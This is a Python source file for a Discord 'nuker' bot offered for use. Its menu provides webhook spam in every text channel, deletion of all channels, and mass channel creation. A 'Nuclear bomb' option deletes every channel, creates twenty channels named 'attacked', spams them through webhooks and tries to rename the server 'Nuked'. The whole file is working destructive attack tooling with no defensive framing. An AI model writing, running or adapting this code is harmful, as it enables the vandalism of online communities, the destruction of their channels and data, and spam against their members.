import discord
from discord.ext import commands,tasks
from discord import app_commands
import asyncio

token = input("Enter your bot token : ")

class MultiTaskBot(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    async def on_ready(self):
        print(f"Bot logged in as {self.user}")

        while True:
            print("-"*50)
            print("\n🎉 **Welcome to the main menu of the bot!** 🎉")
            print("1️⃣ - Webhook spam.")
            print("2️⃣ - Delete all channels")
            print("3️⃣ - Create channels")
            print("4️⃣ - Nuclear bomb")
            print("5️⃣ - Exit")
            print("📶 If you get an error anywhere, close the program and try again.")
            choice = input("Please enter the desired option number : ")

            if choice == "1":
                await self.create_webhooks()
            elif choice == "2":
                await self.delete_all_channels()
            elif choice == "3":
                await self.create_channels()
            elif choice == "4":
                await self.nuke()
            elif choice == "5":
                print("Exiting...")
                await self.close()
                break
            else:
                print("❌ Invalid option! Please try again.")

    async def create_webhooks(self):
        guild_id = int(input("Please enter the Server ID : "))
        guild = self.get_guild(guild_id)
        if not guild:
            print("❌ Server with this ID was not found.")
        
        else :
            print(f"✅ Server '{guild.name}' found!")
            name = input("The name you want to send the message with : ")
            message = input("Enter the message you want to send : ")
            avatar = input("Avatar link you want : ")
            message_count = int(input("How many messages do you want to send per channel ? "))
            

            text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]

            for channel in text_channels:
                try:
                    webhook = await channel.create_webhook(name=f"Webhook for {channel.name}")
                    for i in range(message_count):
                        await webhook.send(
                            content = message,
                            username = name,
                            avatar_url = avatar
                        )

                    print(f"✅ {message_count} messages sent to channel '{channel.name}'.")

                except discord.Forbidden:
                    print(f"❌ I don't have access to create a video on the channel '{channel.name}'.")

                except discord.HTTPException as e:
                    print(f"❌ Error on channel '{channel.name}' : {e}")

    async def delete_all_channels(self):
        guild_id = int(input("Please enter the Server ID : "))
        guild = self.get_guild(guild_id)

        if not guild:
            print("❌ Server with this ID was not found.")
        
        else:
            print(f"✅ Server '{guild.name}' found!")
            confirmation = input("Are you sure you want to delete all channels from this server? (yes/no) : ").lower()

            if confirmation != "yes":
                print("❌ Operation canceled.")
            
            else:
                channels = guild.channels

                for channel in channels:
                    try:
                        await channel.delete()
                        print(f"✅ Channel '{channel.name}' has been deleted.")
                    except discord.Forbidden:
                        print(f"❌ I don't have permission to delete the channel '{channel.name}'.")
                    except discord.HTTPException as e:
                        print(f"❌ Error deleting channel '{channel.name}': {e}")

                print(f"✅ All channels on the server '{guild.name}' have been deleted.")

    async def create_channels(self):
        guild_id = int(input("Please enter the Server ID : "))
        guild = self.get_guild(guild_id)

        if not guild:
            print("❌ Server with this ID was not found.")
            return

        print(f"✅ Server '{guild.name}' found!")
        
        number_of_channels = int(input("How many channels do you want to create ? "))
        
        channel_name = input("The name you want to use for the channels : ")

        for i in range(number_of_channels):
            try:
                await guild.create_text_channel(channel_name)
                print(f"✅ Channel '{channel_name}' created.")
            except discord.Forbidden:
                print(f"❌ I do not have access to create a channel on the server '{guild.name}'.")
            except discord.HTTPException as e:
                print(f"❌ Error creating channel '{channel_name}': {e}")

    async def nuke(self):
        guild_id = int(input("Please enter the Server ID : "))
        guild = self.get_guild(guild_id)
        if not guild:
            print("❌ Server with this ID was not found.")
        
        else:
            print(f"✅ Server '{guild.name}' found!")
            confirmation = input("Are you sure you want to blow up the server ? (yes/no) : ").lower()

            if confirmation != "yes":
                print("❌ Operation canceled.")
            
            else:
                channels = guild.channels

                for channel in channels:
                    try:
                        await channel.delete()

                    except discord.Forbidden:
                        print(f"❌ I don't have permission to delete the channel '{channel.name}'.")

                    except discord.HTTPException as e:
                        print(f"❌ Error deleting channel '{channel.name}': {e}")

                print(f"✅ All channels on the server '{guild.name}' have been deleted.")
                for i in range(20):
                    try:
                        await guild.create_text_channel("attacked")

                    except discord.Forbidden:
                        print(f"❌ I do not have access to create a channel on the server '{guild.name}'.")

                    except discord.HTTPException as e:
                        print(f"❌ Error creating channels : {e}")

                message = input("Enter the message you want to send : ")
                avatar = input("Avatar link you want : ")

                text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]

                for channel in text_channels:
                    try:
                        webhook = await channel.create_webhook(name=f"Webhook for {channel.name}")
                        for i in range(10):
                            await webhook.send(
                                content = message,
                                username = "Attacked",
                                avatar_url = avatar
                            )
                        print(f"✅ Messages sent")

                    except discord.Forbidden:
                        print(f"❌ I don't have access to create a video on the channel '{channel.name}'.")

                    except discord.HTTPException as e:
                        print(f"❌ Error on channel '{channel.name}' : {e}")
                try:
                    await guild.edit("Nuked")
                    print(f"✅ Done")

                except discord.Forbidden:
                    print("❌ I do not have access to change the server name.")

                except discord.HTTPException as e:
                    print(f"❌ Error changing server name: {e}")

intents = discord.Intents.all()
intents.messages = True
intents.guilds = True
bot = MultiTaskBot(intents=intents)

try :
    bot.run(token)

except Exception as e :
    print(f"An error occurred while running the bot : {e}")
